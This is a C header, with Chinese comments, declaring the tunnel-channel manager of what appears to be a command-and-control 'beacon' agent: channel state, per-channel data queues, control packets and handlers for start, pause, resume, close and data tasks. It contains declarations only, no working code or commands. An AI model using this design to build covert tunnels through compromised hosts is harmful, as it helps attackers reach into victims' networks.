#pragma once

#include "beacon_packet.h"

struct BeaconContext;

#define TUNNEL_MAX_CHANNELS 64
#define TUNNEL_MAX_CONTROL_PACKETS 256

#define TUNNEL_REASON_NONE 0
#define TUNNEL_REASON_UNKNOWN 1
#define TUNNEL_REASON_AUTH_FAILED 2
#define TUNNEL_REASON_NETWORK_UNREACHABLE 3
#define TUNNEL_REASON_TIMEOUT 4
#define TUNNEL_REASON_CONNECTION_REFUSED 5
#define TUNNEL_REASON_DNS_FAILED 6
#define TUNNEL_REASON_GATEWAY_FAILED 7
#define TUNNEL_REASON_CANCELED 8
#define TUNNEL_REASON_QUEUE_FULL 9
#define TUNNEL_REASON_UNSUPPORTED_PROTO 10
#define TUNNEL_REASON_DUPLICATE_CHANNEL 11
#define TUNNEL_REASON_PEER_CLOSED 12
#define TUNNEL_REASON_CONNECTION_RESET 13
#define TUNNEL_REASON_BROKEN_PIPE 14
#define TUNNEL_REASON_CONNECTION_ABORTED 15

/* 等待发送的待处理数据包 */
typedef struct TunnelPendingPacket {
    ByteBuf packet;
    struct TunnelPendingPacket* next;
} TunnelPendingPacket;

typedef struct TunnelManager TunnelManager;

/* 单个隧道通道的状态 */
typedef struct TunnelChannel {
    UINT32 job_id;
    CHAR tunnel_id[128];
    CHAR channel_id[128];
    CHAR mode[32];
    CHAR proto[8];
    CHAR target[512];
    INT connect_timeout_ms;   /* 连接超时（ms），由 worker 线程在 dial 时使用 */
    SOCKET socket_handle;
    HANDLE thread_handle;
    TunnelManager* owner;
    volatile LONG closed;
    volatile LONG done;
    volatile LONG paused;
    volatile LONG canceled_by_job;
    volatile LONG connecting; /* 1=worker 线程正在 dial，socket_handle 尚未就绪 */
    ULONGLONG created_at;
    ULONGLONG last_seen;
    UINT64 bytes_in;
    UINT64 bytes_out;
    /* per-channel 数据队列：worker 入队，满时阻塞背压（不丢最旧）；
     * 主循环 TunnelPoll 按通道轮询排空。 */
    TunnelPendingPacket* data_head;
    TunnelPendingPacket* data_tail;
    SIZE_T data_count;
    CONDITION_VARIABLE data_cv; /* 队列满时 worker 在此等待排空/关闭 */
    struct TunnelChannel* next;
} TunnelChannel;

/* 管理所有活动隧道通道和待处理数据包 */
struct TunnelManager {
    struct BeaconContext* ctx;
    CRITICAL_SECTION lock;
    TunnelChannel* channels;
    SIZE_T channel_count;
    TunnelPendingPacket* control_head;
    TunnelPendingPacket* control_tail;
    SIZE_T control_count;
    SIZE_T data_count;            /* 聚合计数（各通道数据队列之和），harvest 判定用 */
    TunnelChannel* poll_rotate;   /* 公平轮询游标：下一 tick 从该通道开始排空 */
    volatile LONG wrote_bytes;    /* 本 tick 已成功写出的下行字节 */
    volatile LONG pending_start;  /* 本 tick 是否启动了新通道（等 StartAck） */
};

/* 启动新隧道通道的请求 */
typedef struct TunnelStartRequest {
    CHAR* mode;
    CHAR* tunnel_id;
    CHAR* channel_id;
    CHAR* proto;
    CHAR* target;
    INT connect_timeout_ms;
} TunnelStartRequest;

/* 控制（暂停/恢复/关闭）隧道通道的请求 */
typedef struct TunnelControlRequest {
    CHAR* tunnel_id;
    CHAR* channel_id;
    CHAR* action;
    CHAR* reason;
} TunnelControlRequest;

/* 通过隧道通道发送数据的请求 */
typedef struct TunnelDataRequest {
    CHAR* tunnel_id;
    CHAR* channel_id;
    ByteBuf data;
} TunnelDataRequest;

VOID TunnelInit(TunnelManager* tm, struct BeaconContext* ctx);
VOID TunnelFree(TunnelManager* tm);
VOID TunnelHarvestWait(TunnelManager* tm);
PacketList TunnelPoll(TunnelManager* tm);
VOID TunnelAppendJobs(TunnelManager* tm, ByteBuf* out, SIZE_T* count, ULONGLONG now);

PacketList TunnelHandleStart(struct BeaconContext* ctx, UINT32 task_id, Parser* parser);
PacketList TunnelHandleControl(TunnelManager* tm, Parser* parser, const CHAR* action_override);
PacketList TunnelHandleData(TunnelManager* tm, Parser* parser);
BOOL TunnelCancelJob(struct BeaconContext* ctx, UINT32 job_id, ByteBuf* out);
